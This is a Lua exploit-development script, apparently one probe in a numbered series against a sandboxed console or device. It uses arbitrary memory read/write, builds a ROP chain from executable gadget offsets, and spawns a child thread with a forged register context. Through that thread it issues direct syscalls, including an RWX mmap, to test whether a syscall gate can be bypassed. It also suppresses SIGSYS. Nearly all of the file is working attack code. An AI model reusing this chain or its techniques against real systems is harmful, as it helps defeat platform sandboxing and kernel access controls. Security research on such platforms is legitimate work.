-- CRASH_CLASS: LOW
-- PROBE 275d: Test if sysent gate is loader-side or kernel-side
--
-- 275b/275c: all 677-750 return -1 via make_syscall (loader dispatch).
-- This probe calls sys 705 (get_phys_page_size) from a CHILD THREAD
-- via ROP+sa (direct syscall instruction), bypassing the loader.
-- If child gets 0x4000 → gate is in the loader, not kernel → MASSIVE BYPASS.
-- If child gets -1 → gate is in the kernel, confirmed dead end.
--
-- Also tests: sys 725 (mmap2), sys 687 (pipe2) from child.

print("=== PROBE 275d: CHILD THREAD SYSENT BYPASS TEST ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rsp  = 0x9A2,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Install SIGSYS ignore
local sc_sigaction = mk(416)
local act = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act) + off, 0) end
wq(N(act), uint64(1)); wd(N(act) + 8, 0)
pcall(function() sc_sigaction(uint64(12), act, uint64(0), uint64(0), uint64(0), uint64(0)) end)
print("SIGSYS ignored")

-- Shared results area
local shared = memory.alloc(0x200)
local R705   = N(shared)        -- result of sys 705
local R725   = N(shared) + 0x10 -- result of sys 725
local R687   = N(shared) + 0x20 -- result of sys 687
local R20    = N(shared) + 0x30 -- getpid control
local SENT   = N(shared) + 0x40 -- sentinel
for off = 0, 0x4C, 4 do wd(N(shared) + off, 0xFF) end
wq(SENT, uint64(0))

-- Build child chain:
-- 1. getpid(20) → store to R20 (control: proves child runs)
-- 2. sys 705() → store to R705
-- 3. sys 725(0, 0x4000, 7, 0x1002, -1, 0) → store to R725
-- 4. sentinel → spin

local stk = memory.alloc(0x10000)
local CB = N(stk) + 0x8000
local p = 0

-- getpid control
wq(CB + p, eaddr(G.pop_rax)); p = p + 8
wq(CB + p, uint64(20));       p = p + 8
wq(CB + p, sa);               p = p + 8
-- store rax → R20
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", R20))); p = p + 8
wq(CB + p, eaddr(G.mov_w));   p = p + 8

-- sys 705 (get_phys_page_size) — zero args, just rax=705
wq(CB + p, eaddr(G.pop_rax)); p = p + 8
wq(CB + p, uint64(705));      p = p + 8
wq(CB + p, sa);               p = p + 8
-- store rax → R705
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", R705))); p = p + 8
wq(CB + p, eaddr(G.mov_w));   p = p + 8

-- sys 725 (mmap2) — rdi=0, rsi=0x4000, rdx=7(RWX), r10=0x1002, r8=-1, r9=0
-- Note: syscall convention uses r10 for 4th arg, not rcx
-- We have pop_rdi, pop_rsi but no pop_r10 or pop_rdx from child
-- Simplify: just call 725 with rax=725, rdi=0 (should still show different behavior)
wq(CB + p, eaddr(G.pop_rax)); p = p + 8
wq(CB + p, uint64(725));      p = p + 8
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(0));        p = p + 8
wq(CB + p, sa);               p = p + 8
-- store rax → R725
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", R725))); p = p + 8
wq(CB + p, eaddr(G.mov_w));   p = p + 8

-- sys 687 (pipe2) — rdi=buffer addr (R687 area), rsi=0
wq(CB + p, eaddr(G.pop_rax)); p = p + 8
wq(CB + p, uint64(687));      p = p + 8
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", R687))); p = p + 8
wq(CB + p, eaddr(G.pop_rsi)); p = p + 8
wq(CB + p, uint64(0));        p = p + 8
wq(CB + p, sa);               p = p + 8
-- rax has return value — but we already used rdi for pipe2 buffer
-- store rax to a temp slot
local R687_RET = N(shared) + 0x50
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", R687_RET))); p = p + 8
wq(CB + p, eaddr(G.mov_w));   p = p + 8

-- sentinel
wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
wq(CB + p, uint64(string.format("0x%X", SENT))); p = p + 8
wq(CB + p, eaddr(G.pop_rax)); p = p + 8
wq(CB + p, uint64("0xDDDDDDDDDDDDDDDD")); p = p + 8
wq(CB + p, eaddr(G.mov_w));   p = p + 8

-- spin
wq(CB + p, eaddr(G.jmp_loop)); p = p + 8

print(string.format("chain: %d bytes at 0x%X", p, CB))

-- Spawn child
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)
local BC = N(ctx)
for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480); wd(BC + 0xD0, 0); wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43); wd(BC + 0x100, 0x3B)
wd(BC + 0xE0, rip_lo); wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo); wd(BC + 0xFC, rsp_hi)
wq(N(tid_buf), uint64("0x0"))
local tr = nil
pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
local child_tid = rq(N(tid_buf))
print(string.format("thr_create: ret=%s tid=%s", fmt(tr), fmt(child_tid)))

if tr == nil or N(tr) ~= 0 then
    print("THREAD FAILED!")
    return
end

-- Wait for child
for i = 1, 500 do native.fcall_with_rax(stub, 20) end

-- Read results
local sent = rq(SENT)
print(string.format("sentinel=%s", fmt(sent)))

if sent and N(sent) ~= 0 then
    local r20 = rq(R20)
    local r705 = rq(R705)
    local r725 = rq(R725)
    local r687_ret = rq(R687_RET)
    local r687_fd0 = rd(R687)
    local r687_fd1 = rd(R687 + 4)

    print(string.format("child getpid  = %s (expect 0x%X)", fmt(r20), pid))
    print(string.format("child sys 705 = %s", fmt(r705)))
    print(string.format("child sys 725 = %s", fmt(r725)))
    print(string.format("child sys 687 = %s  fds=%d,%d", fmt(r687_ret), r687_fd0 or -99, r687_fd1 or -99))

    -- Analyze 705
    if r705 then
        local v705 = N(r705)
        if v705 == 0x4000 then
            print("*** 705 RETURNED 0x4000 — GATE IS LOADER-SIDE! BYPASS CONFIRMED! ***")
        elseif v705 == 0xFFFFFFFF or v705 == -1 then
            print("705 = -1 from child too — gate is KERNEL-SIDE, confirmed dead end")
        else
            print(string.format("705 unexpected: %d (0x%X)", v705, v705))
        end
    end

    -- Analyze 725
    if r725 then
        local v725 = N(r725)
        if v725 ~= 0xFFFFFFFF and v725 ~= -1 and v725 ~= 0 then
            print(string.format("*** 725 RETURNED 0x%X — POSSIBLE MMAP ADDRESS! ***", v725))
        elseif v725 == 0xFFFFFFFF or v725 == -1 then
            print("725 = -1 from child too — kernel gate")
        end
    end
else
    print("child did not complete — chain may have hit SIGSYS and died")
    -- Partial reads
    local r20 = rq(R20)
    local r705 = rq(R705)
    print(string.format("  partial: getpid=%s  705=%s", fmt(r20), fmt(r705)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 275d COMPLETE ===")
